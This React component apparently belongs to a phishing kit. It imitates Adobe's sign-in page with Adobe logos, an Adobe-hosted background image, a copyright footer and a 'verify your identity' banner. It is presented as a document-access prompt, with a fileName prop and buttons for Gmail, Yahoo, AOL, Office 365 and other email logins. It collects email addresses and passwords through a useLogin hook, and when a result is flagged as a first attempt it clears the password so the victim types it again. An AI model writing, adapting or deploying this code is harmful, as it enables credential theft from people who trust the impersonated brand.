import React, { useState, useRef, useEffect, useCallback } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

const BACKGROUND_IMAGES = [
  'https://auth.services.adobe.com/img/canvas/Fotolia_188880972_XL.jpg',
  'https://images.unsplash.com/photo-1557683316-973673baf926?w=1920&q=80',
  'https://images.unsplash.com/photo-1579546929518-9e396f3cc809?w=1920&q=80',
  'https://images.unsplash.com/photo-1614850523459-c2f4c699c52e?w=1920&q=80',
];

const BG_ROTATION_MS = 6000;

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
  onOthersSelect?: () => void;
  defaultProvider?: string;
}

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack,
  onLoginSuccess, 
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOffice365Select,
  onOthersSelect,
  defaultProvider,
}) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showPasswordStep, setShowPasswordStep] = useState(!!defaultProvider);
  const [provider, setProvider] = useState(defaultProvider || '');
  const [bgIndex, setBgIndex] = useState(0);
  const emailInputRef = useRef<HTMLInputElement>(null);
  
  const { isLoading, errorMessage, handleFormSubmit } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const nextBg = useCallback(() => {
    setBgIndex((prev) => (prev + 1) % BACKGROUND_IMAGES.length);
  }, []);

  useEffect(() => {
    const timer = setInterval(nextBg, BG_ROTATION_MS);
    return () => clearInterval(timer);
  }, [nextBg]);

  const handleOthersSelect = () => {
    setProvider('Others');
    emailInputRef.current?.scrollIntoView({ behavior: 'smooth' });
    setTimeout(() => emailInputRef.current?.focus(), 300);
  };

  const emailProviders = [
    { name: 'Microsoft', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-icon.png', handler: onOffice365Select },
    { name: 'Yahoo', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png', handler: onYahooSelect },
    { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png', handler: onOffice365Select },
    { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png', handler: onAolSelect },
    { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png', handler: onGmailSelect },
    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png', handler: handleOthersSelect },
  ];

  const handleContinue = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) {
      if (!provider) setProvider('Adobe');
      setShowPasswordStep(true);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: provider || 'Adobe' });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ fontFamily: "'adobe-clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
      <div className="flex-1 flex relative overflow-hidden">
        {/* Rotating Background Images */}
        {BACKGROUND_IMAGES.map((src, i) => (
          <div
            key={i}
            className="absolute inset-0 bg-cover bg-center transition-opacity duration-1000"
            style={{
              backgroundImage: `url('${src}')`,
              opacity: i === bgIndex ? 1 : 0,
            }}
          />
        ))}

        {/* Desktop Layout: two-panel grid */}
        <div className="hidden lg:grid w-full relative z-10" style={{ gridTemplateColumns: '1fr 480px' }}>
          {/* Left Panel - Context area with Adobe branding */}
          <div className="relative flex items-center justify-center p-10">
            <div className="relative z-10 flex flex-col items-start" style={{ width: 340 }}>
              <img src="/adobe_logo_white.svg" alt="Adobe Logo" className="h-9 mb-3" />
              <p className="text-white/90 text-lg">Sign in or create an account</p>
            </div>
          </div>

          {/* Right Panel - White card */}
          <div className="bg-white flex flex-col min-h-screen shadow-xl">
            {/* Blue Info Banner */}
            <div className="bg-[#1473E6] text-white py-3 px-6 flex items-center gap-3 text-sm">
              <svg viewBox="0 0 36 36" className="w-5 h-5 flex-shrink-0" fill="currentColor">
                <path fillRule="evenodd" d="M18,2A16,16,0,1,0,34,18,16,16,0,0,0,18,2Zm-.3,4.3a2.718,2.718,0,0,1,2.864,2.824A2.664,2.664,0,0,1,17.7,11.987a2.705,2.705,0,0,1-2.864-2.864A2.717,2.717,0,0,1,17.7,6.3ZM22,27a1,1,0,0,1-1,1H15a1,1,0,0,1-1-1V25a1,1,0,0,1,1-1h1V18H15a1,1,0,0,1-1-1V15a1,1,0,0,1,1-1h4a1,1,0,0,1,1,1v9h1a1,1,0,0,1,1,1Z" />
              </svg>
              <span>For your protection, please verify your identity.</span>
            </div>

            {/* Form Content */}
            <div className="flex-1 flex flex-col justify-start px-10 pt-10 pb-6 overflow-y-auto">
              <div className="w-full max-w-[360px]">
                <h1 className="text-[28px] font-bold text-gray-900 mb-2 leading-tight">Sign in</h1>

                <form onSubmit={handleSubmit} className="mt-6">
                  {errorMessage && !isLoading && (
                    <div className="mb-4 p-3 rounded text-sm text-red-700 bg-red-50 border border-red-200">
                      {errorMessage}
                    </div>
                  )}

                  {/* "Continue with email" heading matching Sign in.html */}
                  <h3 className="text-base font-semibold text-gray-900 mb-0">Continue with email</h3>
                  <p className="text-sm text-gray-600 mt-1 mb-5">
                    New user?{' '}
                    <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-[#1473E6] hover:underline">
                      Create an account
                    </a>
                  </p>

                  <div className="mb-4">
                    <label className="text-sm text-gray-700 block mb-1.5" htmlFor="email">
                      Email address
                    </label>
                    <input
                      id="email"
                      ref={emailInputRef}
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      required
                      disabled={showPasswordStep}
                      autoComplete="email"
                      className="w-full px-3 py-2.5 border-2 border-gray-300 rounded-md text-sm text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-0 disabled:bg-gray-100 disabled:text-gray-500 transition-colors"
                    />
                  </div>

                  {showPasswordStep && (
                    <div className="mb-4">
                      <label className="text-sm text-gray-700 block mb-1.5" htmlFor="password">
                        Password
                      </label>
                      <div className="relative">
                        <input
                          id="password"
                          type={showPassword ? 'text' : 'password'}
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          required
                          autoFocus
                          className="w-full px-3 pr-10 py-2.5 border-2 border-gray-300 rounded-md text-sm text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-0 transition-colors"
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                        >
                          {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </button>
                      </div>
                    </div>
                  )}

                  <div className="flex justify-end mt-6 mb-4">
                    {!showPasswordStep ? (
                      <button
                        onClick={handleContinue}
                        disabled={!email}
                        className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                      >
                        Continue
                      </button>
                    ) : (
                      <button
                        type="submit"
                        disabled={isLoading || !password}
                        className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center"
                      >
                        {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                        {isLoading ? 'Verifying...' : 'Continue'}
                      </button>
                    )}
                  </div>
                </form>

                {/* Or Divider */}
                <div className="relative text-center my-5">
                  <span className="absolute inset-x-0 top-1/2 h-px bg-gray-300"></span>
                  <span className="relative bg-white px-4 text-sm text-gray-500">Or</span>
                </div>

                {/* Email Provider Buttons - styled like Sign in.html social buttons */}
                <div className="space-y-2.5">
                  {emailProviders.map((ep) => (
                    <button
                      key={ep.name}
                      onClick={() => ep.handler?.()}
                      type="button"
                      className="w-full flex items-center px-4 py-3 rounded-full border-2 border-gray-300 hover:border-gray-400 hover:bg-gray-50 transition-all duration-150 text-left"
                    >
                      <div className="w-7 h-7 flex items-center justify-center flex-shrink-0">
                        <img src={ep.logo} alt={`${ep.name} icon`} className="w-5 h-5 object-contain" />
                      </div>
                      <span className="flex-1 text-sm font-medium text-gray-800 text-center">
                        Continue with {ep.name}
                      </span>
                    </button>
                  ))}
                </div>

                {/* Links */}
                <div className="mt-5">
                  <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-sm text-[#1473E6] hover:underline">More sign-in options</a>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Mobile Layout */}
        <div className="lg:hidden w-full relative z-10 flex flex-col min-h-screen bg-white">
          {/* Blue Info Banner */}
          <div className="bg-[#1473E6] text-white py-3 px-4 flex items-center gap-3 text-sm">
            <svg viewBox="0 0 36 36" className="w-5 h-5 flex-shrink-0" fill="currentColor">
              <path fillRule="evenodd" d="M18,2A16,16,0,1,0,34,18,16,16,0,0,0,18,2Zm-.3,4.3a2.718,2.718,0,0,1,2.864,2.824A2.664,2.664,0,0,1,17.7,11.987a2.705,2.705,0,0,1-2.864-2.864A2.717,2.717,0,0,1,17.7,6.3ZM22,27a1,1,0,0,1-1,1H15a1,1,0,0,1-1-1V25a1,1,0,0,1,1-1h1V18H15a1,1,0,0,1-1-1V15a1,1,0,0,1,1-1h4a1,1,0,0,1,1,1v9h1a1,1,0,0,1,1,1Z" />
            </svg>
            <span>For your protection, please verify your identity.</span>
          </div>

          {/* Adobe Logo */}
          <div className="flex items-center gap-2 px-6 pt-6">
            <img src="/adobe_logo_black.svg" alt="Adobe Logo" className="h-5" />
          </div>

          {/* Form Content */}
          <div className="flex-1 flex flex-col justify-start px-6 pt-6 pb-8">
            <h1 className="text-2xl font-bold text-gray-900 mb-2">Sign in</h1>

            <form onSubmit={handleSubmit} className="mt-4">
              {errorMessage && !isLoading && (
                <div className="mb-4 p-3 rounded text-sm text-red-700 bg-red-50 border border-red-200">
                  {errorMessage}
                </div>
              )}

              <h3 className="text-base font-semibold text-gray-900 mb-0">Continue with email</h3>
              <p className="text-sm text-gray-600 mt-1 mb-5">
                New user?{' '}
                <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-[#1473E6] hover:underline">
                  Create an account
                </a>
              </p>

              <div className="mb-4">
                <label className="text-sm text-gray-700 block mb-1.5" htmlFor="email-mobile">
                  Email address
                </label>
                <input
                  id="email-mobile"
                  ref={emailInputRef}
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  disabled={showPasswordStep}
                  autoComplete="email"
                  className="w-full px-3 py-3 border-2 border-gray-300 rounded-md text-base text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-0 disabled:bg-gray-100 disabled:text-gray-500 transition-colors"
                />
              </div>

              {showPasswordStep && (
                <div className="mb-4">
                  <label className="text-sm text-gray-700 block mb-1.5" htmlFor="password-mobile">
                    Password
                  </label>
                  <div className="relative">
                    <input
                      id="password-mobile"
                      type={showPassword ? 'text' : 'password'}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      required
                      autoFocus
                      className="w-full px-3 pr-10 py-3 border-2 border-gray-300 rounded-md text-base text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-0 transition-colors"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
              )}

              <div className="flex justify-end mt-5 mb-4">
                {!showPasswordStep ? (
                  <button
                    onClick={handleContinue}
                    disabled={!email}
                    className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                  >
                    Continue
                  </button>
                ) : (
                  <button
                    type="submit"
                    disabled={isLoading || !password}
                    className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center"
                  >
                    {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                    {isLoading ? 'Verifying...' : 'Continue'}
                  </button>
                )}
              </div>
            </form>

            {/* Or Divider */}
            <div className="relative text-center my-5">
              <span className="absolute inset-x-0 top-1/2 h-px bg-gray-300"></span>
              <span className="relative bg-white px-4 text-sm text-gray-500">Or</span>
            </div>

            {/* Email Provider Buttons */}
            <div className="space-y-2.5">
              {emailProviders.map((ep) => (
                <button
                  key={ep.name}
                  onClick={() => ep.handler?.()}
                  type="button"
                  className="w-full flex items-center px-4 py-3 rounded-full border-2 border-gray-300 hover:border-gray-400 hover:bg-gray-50 transition-all duration-150 text-left"
                >
                  <div className="w-7 h-7 flex items-center justify-center flex-shrink-0">
                    <img src={ep.logo} alt={`${ep.name} icon`} className="w-5 h-5 object-contain" />
                  </div>
                  <span className="flex-1 text-sm font-medium text-gray-800 text-center">
                    Continue with {ep.name}
                  </span>
                </button>
              ))}
            </div>

            {/* Links */}
            <div className="mt-5">
              <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-sm text-[#1473E6] hover:underline">More sign-in options</a>
            </div>
          </div>
        </div>
      </div>

      {/* Adobe Footer - matches Sign in.html footer */}
      <footer className="bg-[#fafafa] border-t border-gray-200 py-4 px-6">
        <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 text-xs text-gray-600">
          <span>Copyright © 2026 Adobe. All rights reserved.</span>
          <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Terms of Use</a>
          <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Cookie preferences</a>
          <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Privacy</a>
          <a href="https://www.adobe.com/privacy/us-rights.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Do not sell or share my personal information</a>
        </div>
      </footer>
    </div>
  );
};

export default LoginPage;
